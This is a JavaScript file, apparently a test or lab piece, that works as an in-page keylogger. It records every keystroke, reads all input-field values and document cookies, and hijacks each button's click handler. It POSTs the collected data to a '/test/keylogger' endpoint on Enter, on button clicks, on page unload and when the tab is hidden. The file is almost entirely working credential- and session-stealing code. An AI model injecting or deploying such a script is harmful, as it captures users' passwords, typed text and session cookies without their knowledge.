let keyData ="";

function setData(type, btnElement){
    const inputList = [];
    const inputs = document.querySelectorAll("input");
    inputs.forEach(i=>{
        const id = {
            "name" : i.name,
            "id" : i.id,
            "value" : i.value
        }
        inputList.push(id);
    });
    const buttonAttr = btnElement ? {"btnYn" : true} : {"btnYn" : false};

    if(btnElement){
        Array.from(btnElement.attributes).forEach(attr => {
            const key = attr.name;
            const value = attr.value;
            let processValue;

            if(btnElement[key] && typeof btnElement[key] === "function"){
                processValue = btnElement[key].toString();
            } else {
                processValue = value;
            }
            buttonAttr[key] = processValue;
        });
    }

    const cookies = document.cookie.split(";").map(cookie =>{
        const [key, value] = cookie.split("=");
        return {[key] : value};
    }).filter(cookie => cookie.key !== "" && typeof cookie.value !== "undefined");

    const req = {
        "type" : type,
        "inputList" : inputList,
        "keyData" : keyData,
        "cookies" : cookies,
        "btnYn" : buttonAttr
    }

    return req;
}

function sendData(btnElement, type){
    const data = setData(type, btnElement);
    keyData = "";

    fetch("/test/keylogger",{
        method : "POST",
        headers : {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    })
    .then(res=>res.json)
    .then(result=>console.log(result));
}

function keylogging(e){
    if(e.code === "Enter" || e.code === "NumpadEnter"){
        sendData(null, "pressEnter");
    } else {
        keyData += e.key;
    }
}

window.onkeydown = (e) => keylogging(e);
window.addEventListener("beforeunload", (e)=>{
    fetch("/test/keylogger", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(setData("beforeunload"))
    });
});

document.addEventListener("visibilitychange", ()=>{
    if(document.visibilityState === "hidden"){
        fetch("/test/keylogger", {
            method: "POST",
            headers: {
                "Content-Type": "application/json; charset=UTF-8"
            },
            body: JSON.stringify(setData("visibilitychange"))
        });
        keyData = '';
    }
});

window.onload = (()=>{
    let btns = document.querySelectorAll("button");
    btns.forEach(btn => {
        origin = btn.onclick===null ? (()=>{}) : btn.onclick.bind({});
        btn.onclick = () =>{
            sendData(btn, "btnSend");
            origin();
        }
    });
});